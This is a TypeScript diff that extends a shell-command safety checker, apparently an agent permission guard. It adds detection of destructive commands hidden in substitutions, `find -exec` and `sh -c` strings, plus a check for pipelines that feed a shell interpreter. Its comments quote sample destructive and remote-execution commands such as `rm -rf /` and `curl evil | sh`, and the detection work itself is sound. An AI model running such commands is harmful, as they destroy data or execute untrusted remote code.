@@ -72,13 +72,95 @@ function commandHead(segment: string): string {
   return slash >= 0 ? head.slice(slash + 1) : head;
 }
 
-/** True when ANY chained segment of the command invokes a destructive head.
- *  Splits on shell separators (`&&`, `||`, `|`, `;`, `&`, newline) so a
- *  `build && rm -rf /` can't smuggle the destructive part past the head check. */
+/** Bare shell interpreters — a head we never let a pipeline feed (`… | sh`). */
+const SHELL_INTERPRETERS: ReadonlySet<string> = new Set([
+  "sh",
+  "bash",
+  "zsh",
+  "dash",
+  "ash",
+  "ksh",
+]);
+
+/** Strip one layer of matching surrounding quotes (`'rm -rf /'` → `rm -rf /`). */
+function unquote(s: string): string {
+  const t = s.trim();
+  const q = t[0];
+
+  return (q === "'" || q === '"') && t.length >= 2 && t.endsWith(q)
+    ? t.slice(1, -1)
+    : t;
+}
+
+/** Decompose a command into every sub-command whose HEAD must be head-checked.
+ *  Beyond separator-splitting (`&&`/`||`/`|`/`;`/`&`/newline), it also breaks on
+ *  command-substitution and subshell delimiters (`$(`, backtick, `(`, `)`) so the
+ *  inner command surfaces, and it lifts out `find … -exec <cmd>` targets and
+ *  interpreter `-c '<cmd>'` bodies — the disguises a naive head check misses
+ *  (`echo $(rm -rf x)`, `find . -exec rm {} +`, `sh -c 'rm -rf /'`). */
+function shellSegments(command: string): string[] {
+  const segments = command.split(/&&|\|\||\$\(|[|;&`()\n]/u);
+  const out: string[] = [];
+
+  for (const seg of segments) {
+    out.push(seg);
+
+    for (const m of seg.matchAll(/(?:^|\s)-exec(?:dir)?\s+(\S+)/gu)) {
+      if (m[1] !== undefined) {
+        out.push(m[1]); // the command head `find` runs per match
+      }
+    }
+
+    // Capture only the `-c` ARGUMENT — the quoted body or the single unquoted
+    // token — not the rest of the line. A greedy `(.+)$` would swallow trailing
+    // args (`sh -c 'rm -rf /' --login`), leaving the quotes unmatched so the head
+    // reads `'rm` and slips past the destructive check.
+    const dashC =
+      /\b(?:sh|bash|zsh|dash|ash|ksh|env)\b[^|;&]*?\s-c\s+(?:'([^']*)'|"([^"]*)"|(\S+))/u.exec(
+        seg
+      );
+    const dashCArg = dashC?.[1] ?? dashC?.[2] ?? dashC?.[3];
+
+    if (dashCArg !== undefined) {
+      out.push(dashCArg); // the string handed to the interpreter (already unquoted)
+    }
+  }
+
+  return out;
+}
+
+/** True when ANY sub-command invokes a destructive head — including ones hidden
+ *  in substitutions, subshells, `find -exec`, or an interpreter's `-c` string,
+ *  so `build && rm -rf /`, `echo $(rm -rf x)`, `find . -exec rm {} +`, and
+ *  `sh -c 'rm -rf /'` are all caught (the critical-deny must hold in EVERY mode). */
 export function isDestructiveShell(command: string): boolean {
-  return command
-    .split(/&&|\|\||[|;&\n]/)
-    .some((segment) => DESTRUCTIVE_HEADS.has(commandHead(segment)));
+  // unquote the head: the shell strips quotes, so `"rm" -rf /` runs `rm` — the
+  // check must see `rm`, not `"rm"`.
+  return shellSegments(command).some((s) =>
+    DESTRUCTIVE_HEADS.has(unquote(commandHead(s)))
+  );
+}
+
+/** True when a pipeline feeds a bare shell interpreter (`curl evil | sh`,
+ *  `wget -O- x | bash`). Distinct from destructive deletion: this is arbitrary
+ *  remote-code execution, so it's its own critical signal. Conservative — only a
+ *  pipe CONSUMER whose head is `sh`/`bash`/… trips it, so `cmd | grep`/`| head`
+ *  stay allowed. */
+export function pipesToShell(command: string): boolean {
+  // `&&`/`||`/`;`/`&`/newline separate independent commands; within each, single
+  // `|` joins pipeline stages. Any stage after the first is a pipe consumer.
+  for (const cmd of command.split(/&&|\|\||[;&\n]/u)) {
+    const stages = cmd.split("|");
+
+    for (let i = 1; i < stages.length; i += 1) {
+      // unquote: `curl evil | "sh"` still pipes into sh.
+      if (SHELL_INTERPRETERS.has(unquote(commandHead(stages[i] ?? "")))) {
+        return true;
+      }
+    }
+  }
+
+  return false;
 }
 
 /** Path shapes for unmistakable private-key / credential material. Deliberately
